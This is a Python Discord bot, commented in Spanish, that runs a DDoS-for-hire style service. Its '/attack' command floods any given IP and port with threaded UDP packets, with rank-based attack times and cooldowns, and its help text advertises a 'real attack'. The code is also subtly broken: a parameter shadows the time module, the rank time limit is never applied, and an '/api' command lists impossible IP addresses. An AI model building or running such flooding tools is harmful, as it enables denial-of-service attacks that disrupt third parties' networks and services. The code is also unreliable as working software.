import discord
from discord.ext import commands
import time
import threading
import socket

intents = discord.Intents.default()
bot = commands.Bot(command_prefix='/', intents=intents)

# Definir los rangos y sus respectivos tiempos de ataque y cooldown
RANGOS = {
    'BASIC': {'attack_time': 60, 'cooldown_time': 120},
    'VIP': {'attack_time': 120, 'cooldown_time': 60},
    'Admin': {'attack_time': 300, 'cooldown_time': 30},
}

# Diccionario para almacenar los cooldowns de los usuarios
cooldowns = {}

# Simulación de rangos de usuarios (deberías obtener esto desde tu base de datos o sistema de roles)
user_ranks = {
    # Ejemplo: 123456789012345678: 'Admin'
}

# Función para enviar datos a la IP y puerto (todos los métodos hacen lo mismo)
def send_data(ip, port, duration):
    start_time = time.time()
    data = b'A' * 9999  # Datos de 9999 bytes
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def send_packet():
        try:
            sock.sendto(data, (ip, port))
        except Exception as e:
            print(f"Error al enviar datos: {e}")
    
    # Enviar los paquetes durante el tiempo especificado
    while time.time() - start_time < duration:
        threads = []
        for _ in range(100):  # Crear 100 hilos por segundo
            thread = threading.Thread(target=send_packet)
            thread.start()
            threads.append(thread)
        
        # Esperar a que todos los hilos terminen
        for thread in threads:
            thread.join()

    sock.close()

@bot.event
async def on_ready():
    print(f'Bot conectado como {bot.user}')

@bot.command()
async def methods(ctx):
    user_id = ctx.author.id
    user_rank = user_ranks.get(user_id, 'BASIC')
    await ctx.send(f'Para tu rango ({user_rank}), puedes usar cualquier método disponible. Todos realizan el mismo ataque.')

@bot.command()
async def attack(ctx, ip: str, port: int, method: str, time: int):
    user_id = ctx.author.id
    user_rank = user_ranks.get(user_id, 'BASIC')

    # Verificar que el rango sea válido
    if user_rank not in RANGOS:
        await ctx.send('No tienes permiso para usar este comando.')
        return

    # Verificar cooldown
    if user_id in cooldowns and time.time() < cooldowns[user_id]:
        remaining_time = cooldowns[user_id] - time.time()
        await ctx.send(f'Estás en cooldown. Puedes atacar nuevamente en {int(remaining_time)} segundos.')
        return

    # Iniciar el ataque en un hilo separado
    attack_thread = threading.Thread(target=send_data, args=(ip, port, time))
    attack_thread.start()

    # Establecer el tiempo de ataque
    attack_duration = min(time, RANGOS[user_rank]['attack_time'])
    await ctx.send(f'Iniciando ataque a {ip}:{port} durante {attack_duration} segundos.')

    # Establecer el cooldown
    cooldowns[user_id] = time.time() + RANGOS[user_rank]['cooldown_time']

    # Esperar a que el hilo termine
    attack_thread.join()
    await ctx.send('Ataque completado.')

@bot.command()
async def api(ctx):
    await ctx.send('[ON] 192.09.33.1:80 [ON] 123.744.473.58:53 [ON] 178.99.542.88:80')

@bot.command()
async def help(ctx):
    commands_list = """
    Lista de comandos disponibles:
    `/methods` - Muestra que todos los métodos disponibles realizan el mismo ataque.
    `/attack [ip] [port] [method] [time]` - Inicia un ataque real (por ejemplo: /attack 127.0.0.1 80 UDP-LUXO 60).
    `/api` - Muestra la información de la API.
    `/?` - Muestra esta lista de comandos.
    """
    await ctx.send(commands_list)

# Ejecutar el bot con tu token
bot.run('TU_TOKEN_AQUÍ')
